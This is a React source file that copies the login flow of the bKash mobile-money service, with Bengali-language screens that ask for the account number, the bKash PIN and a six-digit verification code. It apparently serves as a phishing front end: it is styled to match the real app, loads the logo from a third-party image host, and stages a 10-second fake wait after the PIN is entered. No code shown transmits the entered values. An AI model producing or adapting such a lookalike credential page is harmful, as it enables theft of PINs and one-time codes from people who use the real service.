/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  ArrowLeft, 
  ChevronRight, 
  ChevronUp,
  ArrowRight,
  ShieldCheck,
  UserRound,
  Fingerprint
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// Custom bKash Icons to match screenshot exactly
const TakaIcon = ({ className = "w-4 h-4" }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
    <path d="M6 12h12M6 12l4-4M6 12l4 4" className="hidden" /> {/* Placeholder */}
    <text x="50%" y="50%" dominantBaseline="middle" textAnchor="middle" fontSize="16" fontWeight="bold" fill="currentColor">৳</text>
  </svg>
);

const SendMoneyIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <path d="M12 2a10 10 0 1 0 10 10" strokeDasharray="4 2" />
      <path d="M22 2l-10 10" />
      <path d="M22 2l-4 0" />
      <path d="M22 2l0 4" />
    </svg>
    <div className="absolute inset-0 flex items-center justify-center">
      <span className="text-[10px] font-bold">৳</span>
    </div>
  </div>
);

const MobileRechargeIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <rect x="6" y="2" width="12" height="20" rx="2" />
      <path d="M12 18h.01" />
    </svg>
    <div className="absolute inset-0 flex items-center justify-center mb-2">
      <span className="text-[10px] font-bold">৳</span>
    </div>
  </div>
);

const CashOutIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M2 18h20" />
    <path d="M5 18V8a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v10" />
    <path d="M9 12h6" />
    <path d="M12 9v6" />
    <rect x="8" y="8" width="8" height="6" rx="1" fill="currentColor" fillOpacity="0.1" />
  </svg>
);

const PaymentIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z" />
    <path d="M3 6h18" />
    <path d="M16 10a4 4 0 0 1-8 0" />
  </svg>
);

const AddMoneyIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4" />
    <path d="M3 5v14a2 2 0 0 0 2 2h16v-5" />
    <path d="M18 12a2 2 0 0 0 0 4h4v-4Z" />
    <circle cx="10" cy="13" r="3" />
    <path d="M10 11v4M8 13h4" />
  </svg>
);

const PayBillIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <path d="M9 18h6" />
      <path d="M10 22h4" />
      <path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7Z" />
    </svg>
    <div className="absolute inset-0 flex items-center justify-center mb-4">
      <span className="text-[8px] font-bold">৳</span>
    </div>
  </div>
);

const SavingsIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <path d="M19 5c-1.5 0-2.8 1.4-3 3-3.5-1.5-11-.3-11 5 0 1.8 0 3 2 4.5V20h4v-2h2v2h4v-2.5c2-1.5 2-2.7 2-4.5 0-1 0-2.5-2-2.5h-1" />
      <path d="M11 5v3" />
    </svg>
    <div className="absolute top-2 left-1/2 -translate-x-1/2">
      <span className="text-[10px] font-bold">৳</span>
    </div>
  </div>
);

const LoanIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M16 16h6" />
    <path d="M19 13v6" />
    <path d="M8 12h4" />
    <path d="M10 10v4" />
    <path d="M3 21h18" />
    <path d="M5 21V7a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v14" />
  </svg>
);

const InsuranceIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z" />
    </svg>
    <div className="absolute inset-0 flex items-center justify-center">
      <span className="text-[10px] font-bold">৳</span>
    </div>
  </div>
);

const BkashToBankIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <circle cx="12" cy="12" r="10" />
      <path d="M12 8l4 4-4 4" />
      <path d="M8 12h8" />
    </svg>
    <div className="absolute left-1 top-1/2 -translate-y-1/2">
      <span className="text-[10px] font-bold">৳</span>
    </div>
  </div>
);

const EducationFeeIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
    <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
    <path d="M8 6h8" />
    <path d="M8 10h8" />
    <path d="M8 14h4" />
  </svg>
);

const MicrofinanceIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
    <circle cx="9" cy="7" r="4" />
    <path d="M22 21v-2a4 4 0 0 0-3-3.87" />
    <path d="M16 3.13a4 4 0 0 1 0 7.75" />
    <rect x="14" y="14" width="8" height="4" rx="1" />
    <text x="18" y="17" fontSize="6" textAnchor="middle" fill="currentColor">NGO</text>
  </svg>
);

const TollIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M3 21h18" />
    <path d="M5 21V7h2v14" />
    <path d="M17 21V7h2v14" />
    <path d="M7 10h10" />
    <rect x="9" y="14" width="6" height="4" />
  </svg>
);

const RequestMoneyIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <rect x="6" y="2" width="12" height="20" rx="2" />
      <path d="M12 18h.01" />
      <path d="M18 10l3 3-3 3" />
    </svg>
    <div className="absolute inset-0 flex items-center justify-center mb-2">
      <span className="text-[10px] font-bold">৳</span>
    </div>
  </div>
);

const RemittanceIcon = ({ className }: { className: string }) => (
  <div className={`relative ${className} flex items-center justify-center`}>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-full h-full">
      <circle cx="12" cy="12" r="10" />
      <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
      <path d="M2 12h20" />
      <path d="M16 8l4 4-4 4" />
    </svg>
    <div className="absolute top-2 right-2">
      <span className="text-[8px] font-bold">৳</span>
    </div>
  </div>
);

const DonationIcon = ({ className }: { className: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className={className}>
    <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
    <path d="M8 12h8" />
  </svg>
);

type View = 'landing' | 'login' | 'otp';

const ServiceIcon = ({ icon: Icon, label, color }: { icon: any, label: string, color: string }) => (
  <div className="service-card">
    <div className="service-icon-wrapper">
      <Icon className={`w-7 h-7 ${color}`} />
    </div>
    <span className="text-[11px] font-medium text-center leading-tight text-gray-700">{label}</span>
  </div>
);

export default function App() {
  const [view, setView] = useState<View>('landing');
  const [mobileNumber, setMobileNumber] = useState('');
  const [pin, setPin] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [timer, setTimer] = useState(20);
  const [isLoading, setIsLoading] = useState(false);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleLoginSubmit = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setView('otp');
    }, 10000);
  };

  useEffect(() => {
    let interval: any;
    if (view === 'otp' && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [view, timer]);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    
    if (value && index < 5) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const renderLanding = () => (
    <div className="flex flex-col h-full bg-bkash-gray overflow-hidden relative">
      {/* Full Screen Image Container */}
      <div className="absolute inset-0 w-full h-full bg-white">
        <img 
          src="https://i.postimg.cc/Bbrt03QK/IMG-20260224-053231.jpg" 
          alt="bKash Landing" 
          className="w-full h-full object-cover"
        />
      </div>

      {/* Bottom Sticky CTA */}
      <div className="absolute bottom-0 left-0 right-0 max-w-md mx-auto bg-bkash-pink p-6 pb-8 shadow-[0_-4px_20px_rgba(226,19,110,0.3)] z-10 rounded-t-3xl">
        <h3 className="text-white text-center text-xl font-bold mb-6">দারুণ সব সার্ভিস আপনার অপেক্ষায়</h3>
        <button 
          onClick={() => setView('login')}
          className="w-full bg-white text-bkash-pink font-bold py-4 rounded-xl text-lg shadow-sm active:scale-[0.98] transition-all mb-6"
        >
          লগ ইন / রেজিস্ট্রেশন
        </button>
        <div className="text-center">
          <button className="text-white font-medium text-lg hover:underline underline-offset-4">
            বিকাশ নাম্বার পরিবর্তন
          </button>
        </div>
      </div>
    </div>
  );

  const renderLogin = () => (
    <div className="flex flex-col h-full bg-white">
      <div className="p-6">
        <div className="flex justify-between items-center mb-12">
          <button onClick={() => setView('landing')} className="p-2 -ml-2 hover:bg-pink-50 rounded-full transition-colors">
            <ArrowLeft className="w-6 h-6 text-bkash-pink" />
          </button>
          <div className="flex items-center gap-2 text-sm font-bold">
            <span className="text-gray-400 cursor-pointer">Eng</span>
            <span className="h-4 w-[1px] bg-gray-300"></span>
            <span className="text-bkash-pink border border-bkash-pink px-2 py-0.5 rounded cursor-pointer">বাং</span>
          </div>
        </div>

        <div className="flex-1">
          <div className="mb-6">
            <img 
              src="https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png" 
              alt="bKash Logo" 
              className="w-16 h-16 object-contain"
            />
          </div>
          <h1 className="text-[26px] font-bold text-gray-700 mb-10 leading-[1.2]">
            আপনার বিকাশ একাউন্টে <br /> লগ ইন করুন
          </h1>

          <div className="space-y-8">
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">একাউন্ট নাম্বার</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-bkash-pink transition-all py-3 px-1">
                <span className="text-xl font-bold text-gray-800">+88</span>
                <input 
                  type="tel" 
                  placeholder="01XXXXXXXXX"
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value.replace(/\D/g, ''))}
                  className="text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-200"
                  maxLength={11}
                  inputMode="numeric"
                  autoFocus
                />
              </div>
            </div>

            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-bkash-pink transition-all py-3 px-1">
                <input 
                  type="password" 
                  placeholder="বিকাশ পিন নাম্বার দিন"
                  value={pin}
                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                  className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
                  maxLength={5}
                  inputMode="numeric"
                />
                <button className="text-bkash-pink p-1">
                  <Fingerprint className="w-8 h-8" strokeWidth={1.5} />
                </button>
              </div>
            </div>

            <div className="pt-2">
              <button className="text-bkash-pink font-bold text-sm hover:underline">পিন ভুলে গিয়েছেন? পিন রিসেট করুন</button>
            </div>
          </div>
        </div>
      </div>

      {/* Sticky Footer Button */}
      <div className="mt-auto p-4 bg-white border-t border-gray-50">
        <button 
          disabled={mobileNumber.length < 11 || pin.length < 5 || isLoading}
          onClick={handleLoginSubmit}
          className={`w-full flex items-center justify-between p-4 rounded-xl transition-all shadow-lg ${
            mobileNumber.length >= 11 && pin.length >= 5 && !isLoading ? 'bg-bkash-pink text-white' : 'bg-gray-300 text-gray-500'
          }`}
        >
          <span className="font-black text-lg ml-2">
            {isLoading ? 'অপেক্ষা করুন...' : 'পরবর্তী'}
          </span>
          <div className={`p-1.5 rounded-full ${mobileNumber.length >= 11 && pin.length >= 5 && !isLoading ? 'bg-white/20' : 'bg-gray-400/20'}`}>
            {isLoading ? (
              <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin" />
            ) : (
              <ArrowRight className="w-6 h-6" />
            )}
          </div>
        </button>
      </div>
    </div>
  );

  const renderOtp = () => (
    <div className="flex flex-col h-full bg-white">
      <div className="p-6">
        <div className="flex justify-between items-center mb-12">
          <button onClick={() => setView('login')} className="p-2 -ml-2 hover:bg-pink-50 rounded-full transition-colors">
            <ArrowLeft className="w-6 h-6 text-bkash-pink" />
          </button>
          <div className="flex items-center gap-2 text-sm font-bold">
            <span className="text-gray-400 cursor-pointer">Eng</span>
            <span className="h-4 w-[1px] bg-gray-300"></span>
            <span className="text-bkash-pink border border-bkash-pink px-2 py-0.5 rounded cursor-pointer">বাং</span>
          </div>
        </div>

        <div className="flex-1">
          <div className="mb-6">
            <img 
              src="https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png" 
              alt="bKash Logo" 
              className="w-16 h-16 object-contain"
            />
          </div>
          <h1 className="text-[26px] font-bold text-gray-700 mb-10 leading-[1.2]">
            আপনার মোবাইল নাম্বার <br /> যাচাই করুন
          </h1>

          <div className="space-y-10">
            <div className="flex justify-between items-end">
              <label className="text-[13px] font-bold text-gray-500 block">ভেরিফিকেশন কোড</label>
              <button 
                disabled={timer > 0}
                className={`text-[13px] font-bold ${timer > 0 ? 'text-gray-400' : 'text-bkash-pink'}`}
              >
                {timer > 0 ? `পুনরায় পাঠান ${timer}s পর` : 'পুনরায় পাঠান'}
              </button>
            </div>

            <div className="flex justify-between gap-2">
              {otp.map((digit, idx) => (
                <input
                  key={idx}
                  ref={(el) => (otpRefs.current[idx] = el)}
                  type="number"
                  value={digit}
                  onChange={(e) => handleOtpChange(idx, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(idx, e)}
                  className="otp-box"
                />
              ))}
            </div>

            <div className="text-[13px] text-gray-500 leading-relaxed">
              ভেরিফিকেশন কোড এই নাম্বারে পাঠানো হয়েছে <br />
              <span className="font-bold text-gray-800 text-sm">+88{mobileNumber}</span> 
              <button onClick={() => setView('login')} className="text-bkash-pink ml-1.5 font-bold underline">(পরিবর্তন করুন)</button>
            </div>

            {/* Security Banner */}
            <div className="relative overflow-hidden rounded-2xl shadow-lg">
              <img 
                src="https://i.postimg.cc/T1Bj4hyJ/IMG-20260224-061348.jpg" 
                alt="Security Warning" 
                className="w-full h-auto object-cover"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Sticky Footer Button */}
      <div className="mt-auto p-4 bg-white border-t border-gray-50">
        <button 
          disabled={otp.some(d => !d)}
          className={`w-full flex items-center justify-between p-4 rounded-xl transition-all shadow-lg ${
            !otp.some(d => !d) ? 'bg-bkash-pink text-white' : 'bg-gray-300 text-gray-500'
          }`}
        >
          <span className="font-black text-lg ml-2">পরবর্তী</span>
          <div className={`p-1.5 rounded-full ${!otp.some(d => !d) ? 'bg-white/20' : 'bg-gray-400/20'}`}>
            <ArrowRight className="w-6 h-6" />
          </div>
        </button>
      </div>
    </div>
  );

  return (
    <div className="max-w-md mx-auto h-screen bg-white shadow-2xl overflow-hidden relative flex flex-col">
      <AnimatePresence mode="wait">
        <motion.div
          key={view}
          initial={{ opacity: 0, x: 10 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -10 }}
          transition={{ duration: 0.25, ease: "easeOut" }}
          className="h-full flex flex-col"
        >
          {view === 'landing' && renderLanding()}
          {view === 'login' && renderLogin()}
          {view === 'otp' && renderOtp()}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
